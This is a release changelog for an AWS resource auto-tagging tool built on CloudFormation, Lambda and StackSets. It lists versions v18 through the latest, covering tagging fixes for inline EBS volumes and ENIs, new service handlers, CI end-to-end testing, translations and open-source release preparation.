### Hidden child resource fix (#12)

- **Problem:** `RunInstances` does not emit separate `CreateVolume` or `CreateNetworkInterface` CloudTrail events for EBS volumes and ENIs attached inline at launch. These resources were silently missed.
- **Fix:** `extract_arns_multi` now calls `describe_instances` with a 30s poll to resolve attached EBS volume IDs, and extracts ENI IDs from the `RunInstances` response.
- **Verified:** ElastiCache replication group nodes, EMR cluster EC2 instances, and EKS node group instances all inherit tags from their parent — no fix needed for those.

### New service handlers (#14, #15)

- WAFv2: WebACL, IPSet
- CodeDeploy: Application, DeploymentGroup
- Expanded E2E coverage to 6 additional MAP 2.0 services

### Bug fixes

- Recognize RGTA `ThrottledException` variant (in addition to `ThrottlingException`) in retry and transient error paths (#17)
- SSM parameter ARN missing `/` separator for flat parameter names (#19)
- Nightly cleanup no longer races in-flight E2E runs (#16)

### Performance

- Parallelized StackSet deploy and delete operations — `MaxConcurrentPercentage: 100` (#18)
- Parallelized teardown fan-out per account (#7)

### CI/CD

- GitHub Actions E2E test suite across 9 AWS accounts
- Handler E2E coverage regression gate — PRs that reduce coverage are blocked (#10)
- Per-linked-account StackSet Lambda + tag verification (#11)
- Nightly cleanup workflow for orphaned test resources
- Python syntax, handler regression, and HTML lint checks

### Open source release

- License changed from Apache-2.0 to MIT-0
- Removed internal security review artifacts
- Holmes scan remediation (service name prefixes, technical accuracy)
- PCSR remediation for public release

---

## v19.20–v19.25 — Multi-Account Hardening

### v19.25
- Fix NAT Gateway ARN construction

### v19.24
- Fix SSM OpsCenter OpsItem tagging

### v19.23
- Fix 8 MAP services from Batch B testing

### v19.22
- Fix Bedrock AgentCore, Payment Cryptography, Cloud WAN tagging

### v19.21
- Add 6 new MAP services
- Fix Kinesis Video Stream tagging

### v19.20
- Support delegated administrator accounts for multi-account deployment
- Preflight verifies caller is management account or registered delegated admin

---

## v19.11–v19.19 — E2E Testing & Production Readiness

### v19.19
- Fix StackSet polling race condition in deploy.sh

### v19.18
- Add StackSet completion message in deploy.sh

### v19.17
- Fix StackSet Lambda timeout for large organizations

### v19.16
- Fix 3 bugs from multi-account E2E testing

### v19.15
- Fix 2 bugs found in E2E testing

### v19.14
- Add local AWS CLI as deployment option alongside CloudShell

### v19.13
- Fix all 6 bugs from E2E test review

### v19.12
- S3 bucket cleanup + multi-account bucket documentation

### v19.11
- E2E test fixes — production ready

---

## v19.1–v19.10 — Configurator & i18n

### v19.9–v19.10
- Comprehensive translation for all UI strings (7 languages: EN, KO, JA, ZH, ID, TH, VI)
- Account scoping for multi-account deployments

### v19.8
- Remove Central Lambda option from configurator (simplified architecture)

### v19.7
- Validation for VPC IDs and central account ID

### v19.5–v19.6
- Backfill respects account and VPC scope
- Deployment report sent after backfill completes

### v19.3–v19.4
- i18n support (7 languages)
- Large-scale migration edge cases
- Full i18n coverage for all UI elements

### v19.2
- PCSR remediation — public release preparation

### v19.1
- ACAT finding: add KMS encryption to SNS topic (`alias/aws/sns`)
- Fix EventBridge prefix patterns, ARN extraction for ALB, Glue, Athena, CodeDeploy, ENI, LoadBalancer, TargetGroup
- Fix ASG ARN construction
- 55+ bugs found and fixed in Phase 1 E2E testing

---

## v18 — Initial Release

- CloudFormation template with Lambda auto-tagger
- EventBridge rule matching resource creation events
- `configurator.html` for generating `deploy.sh`
- Single-account and multi-account (StackSet) deployment modes
- SSM Parameter Store for runtime configuration
- SNS alerting on tagging failures
